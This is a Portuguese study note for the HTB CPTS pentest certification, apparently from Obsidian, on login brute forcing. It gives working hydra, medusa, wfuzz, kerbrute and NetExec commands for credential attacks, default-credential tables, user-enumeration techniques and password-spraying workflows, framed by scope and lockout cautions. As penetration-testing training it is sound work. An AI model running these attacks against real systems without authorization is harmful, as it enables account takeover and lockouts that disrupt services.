---
tema: Web / Autenticação
tópico: Login Brute Forcing — credenciais default, enumeração de usuários e spraying
tags: [htb, cpts, bruteforce, hydra, medusa, password-spray, autenticação]
dificuldade: easy
---

# 🔨 CPTS 16 — Login Brute Forcing

> [!info] Objetivo
> Obter acesso quando **não** existe falha lógica na autenticação. O fluxo é sempre o mesmo: **1)** testar credenciais default, **2)** enumerar usuários válidos, **3)** medir a política de lockout, **4)** só então força bruta direcionada ou password spraying.
> Força bruta online é cara: cada tentativa é uma requisição. Sem uma wordlist boa e uma hipótese de senha, o ataque não vale a pena.

---

## 🎯 Quando usar

| Cenário | Abordagem |
|---------|-----------|
| Painel/app conhecida (Tomcat, Jenkins, phpMyAdmin) | Credenciais default primeiro |
| Form de login próprio | Enumerar usuários → brute com wordlist pequena |
| Portal AD/OWA/VPN exposto | Password spraying com senha comum |
| Serviço de infra (SSH, FTP, RDP, SMB) | Hydra/Medusa/nxc com `rockyou` filtrado |
| Existe política de lockout agressiva | Never brute: enumerar, depois 1–2 tentativas por usuário |
| Login com MFA | Força bruta não resolve; procure bypass de MFA |

> [!warning] Antes de atacar
> Confirme no escopo/RoE que força bruta é permitida. Se a política for `threshold=5`, **4 tentativas por janela** no máximo.

---

## 🧰 Ferramentas

| Ferramenta | Melhor para | Observação |
|-----------|-------------|------------|
| `hydra` | HTTP forms, basic auth, SSH/FTP/RDP/etc. | Suporta `^USER^`/`^PASS^` e strings de sucesso/falha |
| `medusa` | Paralelismo simples em serviços | Boa para SNMP/SMB/VNC |
| `wfuzz` | Fuzzing de forms com filtro de resposta | Ótimo quando a diferença é status/caracteres |
| `nxc` (NetExec) | SMB, WinRM, LDAP, MSSQL, SSH em massa | `--continue-on-success` e `--no-bruteforce` |
| `kerbrute` | Enumeração de usuários AD + spraying | Sem tráfego de logon para userenum |
| Burp Intruder | Forms web complexos (CSRF token, JSON) | Cada tentativa é lenta; use Turbo Intruder |
| `patator` | Alternativa modular ao hydra | Útil com `fgrep` de falha |
| `nxc`/`impacket` | Spraying AD | `impacket` para casos específicos |

---

## 🔑 Credenciais default

Sempre a primeira tentativa — custa segundos e às vezes entrega domínio.

```bash
# Base local de defaults (se ainda não tiver)
# SecLists traz listas prontas:
ls /usr/share/seclists/Passwords/Default-Credentials/
# default-passwords.csv  → combina com hydra -C (user:pass)
```

```bash
# -C: arquivo no formato usuario:senha (combinação exata, uma tentativa por linha)
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv \
  http-get://<IP>/admin/ -t 4
```

| Aplicação | Default clássico que vale tentar |
|-----------|----------------------------------|
| Tomcat Manager | `tomcat:tomcat`, `admin:admin` |
| Jenkins | `admin:admin` (senha inicial em `initialAdminPassword`) |
| phpMyAdmin | `root:` (senha vazia) |
| WordPress / Joomla | `admin:admin` |
| Grafana | `admin:admin` |
| MSSQL | `sa` + senha fraca comum |
| MySQL | `root` sem senha em binds locais |
| Roteadores/APs | `admin:admin`, `admin:password` |
| Impressoras/PDAs | consultar base de defaults do fabricante |

```bash
# Teste direto de basic auth (uma tentativa, sem ferramenta)
curl -u admin:admin -I http://<IP>/admin/
# 200 = credencial válida; 401 = inválida
```

```bash
# Nmap tem NSE para defaults em alguns serviços web
nmap -p80,8080 --script http-default-accounts <IP>
```

---

## 🕵️ Enumeração de usuários

Enumerar usuários é **metade** do trabalho: brute com lista de usuários válidos reduz o espaço de busca drasticamente.

| Vetor | Como testar |
|-------|-------------|
| Mensagem de erro diferente | `"Usuário inválido"` vs `"Senha inválida"` |
| Código HTTP diferente | `200` com texto de erro vs `302` de sucesso |
| Comprimento da resposta | Diferença de poucos bytes já basta |
| Tempo de resposta | Hash calculado só quando o usuário existe |
| Recuperação de senha | Resposta diferente para usuário existente |
| Cadastro (registro) | "E-mail já cadastrado" |
| WordPress | `/?author=1`, `/wp-json/wp/v2/users` |
| AD (Kerberos) | `kerbrute userenum` (AS-REQ, sem logon) |

```bash
# WordPress: enumerar logins por redirect de autor
curl -sI http://<IP>/?author=1 | grep -i location
curl -s http://<IP>/wp-json/wp/v2/users | jq '.[].slug'
```

```bash
# Fuzz de usuários medindo o tamanho da resposta (--hh esconde tamanho conhecido)
wfuzz -c -z file,/usr/share/seclists/Usernames/Names/names.txt \
  --hs "Login inválido" -d "user=FUZZ&pass=teste" http://<IP>/login.php
```

```bash
# AD: enumeração por Kerberos (não gera evento de falha de logon)
kerbrute userenum -d <DOMINIO> --dc <IP> \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o usuarios_validos.txt

# Só uma senha por usuário — isso GERA logons e conta para o lockout
kerbrute passwordspray -d <DOMINIO> --dc <IP> usuarios_validos.txt 'SenhaSazonal2024!'
```

---

## 💥 Hydra

### Sintaxe geral

```bash
hydra -l <USUARIO> -P ~/wordlists/rockyou.txt -f -t 4 -V <IP> <MODULO>
```

| Flag | O que faz |
|------|-----------|
| `-l` / `-L` | usuário único / arquivo de usuários |
| `-p` / `-P` | senha única / arquivo de senhas |
| `-C` | arquivo `user:pass` (combinação, sem produto cartesiano) |
| `-M` | arquivo de alvos (um IP por linha) |
| `-s` | porta |
| `-t` | tarefas paralelas (cuidado: alto = lockout e ruído) |
| `-f` | para na primeira credencial válida |
| `-V` | mostra cada tentativa (só para debug) |
| `-o` | salva resultado em arquivo |
| `-e nsr` | tenta senha vazia (`n`), login como senha (`s`), login invertido (`r`) |
| `-I` | ignora arquivo de restore (recomeça do zero) |
| `-w` | timeout por resposta |
| `-u` | itera usuários primeiro (evita lockout de um único usuário) |
| `-d` | modo debug |

### HTTP POST form (o mais comum)

```bash
hydra -l admin -P ~/wordlists/rockyou.txt -f -t 4 \
  <IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"
```

Estrutura do módulo: `"<caminho>:<corpo>:<condição>"`.

| Marcador | Significado |
|----------|-------------|
| `^USER^` / `^PASS^` | substituídos pelos valores |
| `^USER64^` / `^PASS64^` | mesmo valor em base64 (forms com encoding próprio) |
| `F=` | **string de falha** — resposta que contém isso = tentativa errada |
| `S=` | **string de sucesso** — resposta que contém isso = acerto |
| `C=` | cookie fixo enviado em todas as requisições |
| `H=` | header extra (ex.: `H=Content-Type: application/json`) |

```bash
# Com cookie de sessão e header extra
hydra -l admin -P senhas.txt -t 4 <IP> http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid:H=Content-Type: application/x-www-form-urlencoded:C=lang=pt"

# Login que responde 302 + Set-Cookie no sucesso (use S=)
hydra -L usuarios.txt -p 'SenhaFixa' <IP> http-post-form \
  "/login:username=^USER^&password=^PASS^:S=Set-Cookie: PHPSESSID"
```

> [!tip] Escolha da string
> Prefira `S=` quando o sucesso tem marcador único (redirect, cookie, texto de dashboard). `F=` é mais frágil: página de erro dinâmica (CSRF token, timestamp) faz o hydra "acertar" errado.

### HTTP GET form, basic auth e REST

```bash
# Basic auth (padrão do módulo http-get)
hydra -l admin -P senhas.txt -f http-get://<IP>/admin/

# GET com parâmetros na query
hydra -l admin -P senhas.txt <IP> http-get-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Login failed"

# Basic auth em vários hosts
hydra -L usuarios.txt -P senhas.txt -M hosts.txt http-get://<IP>/ -t 4
```

> [!warning] CSRF token
> Se o form tem token por requisição, hydra quebra (token estático). Nesse caso use Burp Intruder com macro de sessão, ou obtenha o token via script e faça as requisições você mesmo.

### Serviços de infraestrutura

```bash
hydra -l root -P senhas.txt ssh://<IP> -t 4        # SSH: máx ~4 threads, senão derruba conexões
hydra -l administrator -P senhas.txt rdp://<IP>    # RDP: use -t 1, sessão cai fácil
hydra -l ftp -P senhas.txt ftp://<IP>
hydra -l admin -P senhas.txt smb://<IP>
hydra -l sa -P senhas.txt mssql://<IP>
hydra -l root -P senhas.txt mysql://<IP>
hydra -P senhas.txt vnc://<IP>                     # VNC não tem usuário
hydra -l <USUARIO> -P senhas.txt ldap2://<IP>      # LDAP simple bind
```

---

## 🧪 Medusa

```bash
# Form HTTP protegido por basic auth (módulo http usa DIR:)
medusa -h <IP> -u admin -P senhas.txt -M http -m DIR:/admin -T 10

# SSH com lista de usuários e senhas
medusa -h <IP> -U usuarios.txt -P senhas.txt -M ssh -t 4

# SMB (módulo smbnt) e SNMP (módulo snmp com comunidade)
medusa -h <IP> -U usuarios.txt -P senhas.txt -M smbnt -f
medusa -h <IP> -P senhas.txt -M snmp -m TYPE:str
```

| Flag | O que faz |
|------|-----------|
| `-h` / `-H` | host único / arquivo de hosts |
| `-u` / `-U` | usuário único / arquivo |
| `-p` / `-P` | senha única / arquivo |
| `-M` | módulo (`http`, `ssh`, `ftp`, `smbnt`, `rdp`, `mysql`, `vnc`…) |
| `-m` | opção do módulo (`DIR:/admin`, `TYPE:str`) |
| `-t` | threads simultâneas |
| `-f` | para ao achar credencial válida |
| `-e ns` | testa senha vazia e login=senha |

---

## 🧵 wfuzz

```bash
# Dois dicionários: FUZZ = usuário, FUZ2Z = senha
wfuzz -c -z file,usuarios.txt -z file,senhas.txt \
  --hs "Invalid credentials" \
  -d "username=FUZZ&password=FUZ2Z" http://<IP>/login.php
```

| Flag | O que faz |
|------|-----------|
| `--hs` | esconde respostas que contêm a string (hidden string) |
| `--ss` | mostra só respostas que contêm a string |
| `--hc` / `--sc` | esconde/mostra por código HTTP |
| `--hw` / `--hh` | esconde/mostra por número de palavras/caracteres |
| `-z file,x` | dicionário para o payload FUZZ (FUZ2Z, FUZ3Z…) |
| `-d` | corpo POST |
| `--basic user:FUZZ` | força bruta de basic auth |

```bash
# Basic auth: esconde 401 e mostra só 200
wfuzz -c -z file,senhas.txt --hc 401 --basic admin:FUZZ http://<IP>/
```

---

## 🧨 Burp Intruder

| Tipo de ataque | Uso |
|----------------|-----|
| Sniper | Uma posição, um payload set |
| **Pitchfork** | N payload sets em N posições, iterando em paralelo (mesmo índice) — ideal para user:pass pareados |
| **Cluster bomb** | Produto cartesiano — usuários × senhas (o brute clássico) |

Fluxo: interceptar login → `Send to Intruder` → marcar `§user§` e `§pass§` → `Payloads` (lista ou `Runtime file` para wordlists grandes) → `Settings/Options` → `Grep - Match` com a string de sucesso → `Start attack`.

```text
# Configurações que importam
Settings → Grep - Match: "Welcome", "Logout", "dashboard"
Settings → Redirections: "Always" (ou intercepte manualmente)
Resource Pool: 1 thread, delay 200ms  ← respeita lockout e WAF
Hackvertor: @base64/@urlencode nos payloads quando o backend encoda
```

> [!tip] Turbo Intruder
> Para forms com token ou milhares de tentativas, o Intruder clássico é lento. Use a extensão **Turbo Intruder** (race/brute com Python assíncrono) ou um script Python com `requests.Session`.

---

## 🪟 NetExec (nxc)

```bash
# Spraying SMB: para cada usuário, todas as senhas; --continue-on-success não para no primeiro hit
nxc smb <IP> -u usuarios.txt -p senhas.txt --continue-on-success

# --no-bruteforce: pareia linha 1 com linha 1 (user1:pass1, user2:pass2)
nxc smb <IP> -u usuarios.txt -p senhas.txt --no-bruteforce

# Serviços: winrm, rdp, ssh, mssql, ldap seguem o mesmo padrão
nxc winrm <IP> -u usuarios.txt -p senhas.txt --continue-on-success
nxc ldap <IP> -u <USUARIO> -p '<SENHA>' --pass-pol   # lê a política de lockout
nxc mssql <IP> -u sa -p senhas.txt -d master
```

```bash
# Lendo a política de senha/lockout sem credencial (null session, pode falhar)
nxc smb <IP> -u '' -p '' --pass-pol
rpcclient -U '' -N <IP> -c 'getdompwinfo'
```

---

## 🚦 Lockout: como não queimar contas

| Passo | Ação |
|-------|------|
| 1 | Ler a política antes de atacar: `threshold` (tentativas), `duration` (janela), `observation window` |
| 2 | Calcular tentativas seguras = `threshold - 1` por usuário por janela |
| 3 | Preferir spraying (1 senha × N usuários) em vez de brute (N senhas × 1 usuário) |
| 4 | Esperar a janela **observação** completa antes de novo ciclo |
| 5 | Registrar horário de cada ciclo para não repetir o erro |

```bash
# Leitura da política em domínio (credencial válida necessária)
netexec smb <IP> -u <USUARIO> -p '<SENHA>' --pass-pol
# Saída: "Account Lockout Threshold: 5", "Lockout Observation Window: 30 min"
```

> [!danger] Nunca
> Rodar `rockyou.txt` inteiro contra AD sem ler a política. Uma conta bloqueada pode travar serviço de negócio e violar o RoE.

---

## 📚 Wordlists e mutação

| Caminho / ferramenta | Uso |
|----------------------|-----|
| `~/wordlists/rockyou.txt` | Base de senhas (14M) |
| `seclists/Passwords/Common-Credentials/best110.txt` | Top senhas, ataques rápidos |
| `seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt` | Volume maior, ordenado |
| `seclists/Usernames/top-usernames-shortlist.txt` | ~20 logins comuns |
| `seclists/Usernames/Names/names.txt` | Nomes humanos (gerar logins) |
| `cewl -d 3 -m 5 -w palavras.txt http://<IP>` | Palavras do próprio site (senhas de empresa) |
| `username-anarchy -i nomes.txt` | Gera formatos de login (nome.sobrenome, nsobrenome…) |
| `rsmangler --file base.txt --output saida.txt` | Mutação geral (leetspeak, sufixos) |
| `hashcat --stdout base.txt -r /usr/share/john/rules/best64.rule > m.txt` | Mutação com regras do hashcat |
| `john --wordlist=base.txt --rules --stdout > m.txt` | Idem via John |

```bash
# Contexto da empresa: nomes de produto e cultura interna viram senha
cewl -d 3 -m 5 -w cewl.txt http://<IP>
cewl -d 3 -m 5 --with-numbers -w cewl.txt http://<IP>
```

---

## 🔍 Strings de sucesso/falha (o erro nº 1)

| Situação | Como decidir |
|----------|--------------|
| Corpo fixo "Login failed" | `F=Login failed` |
| Redirect para `/dashboard` | `F=/login` (não seguido) ou `S=302` |
| Cookie de sessão novo | `S=Set-Cookie:` (mas o cookie também aparece no erro — teste antes) |
| Resposta idêntica nos dois casos | Compare `Content-Length` em wfuzz/Intruder, não use hydra |
| Mensagem dinâmica com token | Nunca use `F=`; use `S=` com marcador estável |

**Validar sempre**: faça uma tentativa manual com senha certa e uma errada, capture a resposta, e só então configure a ferramenta. Sem isso o ataque produz falsos positivos.

---

## ⚠️ Pegadinhas

- Threads altas em SSH/RDP derrubam conexões e geram falso negativo — `-t 4` e `-t 1` respectivamente.
- Sessão de hydra interrompida cria `hydra.restore`; o próximo run continua de onde parou (`-I` para ignorar).
- Ruído em WAF/IDS: brute barulhento pode banir seu IP no meio do engajamento.
- Account lockout em contas de serviço pode parar um aplicativo em produção. Leia a política.
- `rockyou.txt` é grande e antigo: para AD, mutações de senha sazonal rendem mais que volume.
- Basic auth tem cache do browser/proxy — valide com `curl -I`, não no navegador.
- MFA e "senha + OTP" não quebram por brute; verifique bypass de MFA e reuso de sessão.

---

## ✅ Checklist rápido

- [ ] Escopo permite força bruta e há janela acordada
- [ ] Credenciais default testadas (base + `curl -u`)
- [ ] Usuários válidos enumerados (erro, tempo, WordPress, kerbrute)
- [ ] Política de lockout lida (`--pass-pol` / `getdompwinfo`)
- [ ] Wordlist contextualizada (cewl, regras, nomes do time)
- [ ] Strings `S=`/`F=` validadas com tentativa manual
- [ ] Threads e delay ajustados ao serviço
- [ ] Credencial válida registrada com evidência (hora, comando, saída)
- [ ] Credencial reutilizada em outros serviços (password reuse)

---

## 🔗 Relacionado

- [[CPTS 10 - Password Attacks]]
- [[CPTS 11 - Attacking Common Services]]
- [[CPTS 13 - Active Directory Enumeration and Attacks]]
- [[CPTS 15 - Attacking Web Applications with Ffuf]]
- [[CPTS 14 - Using Web Proxies]]
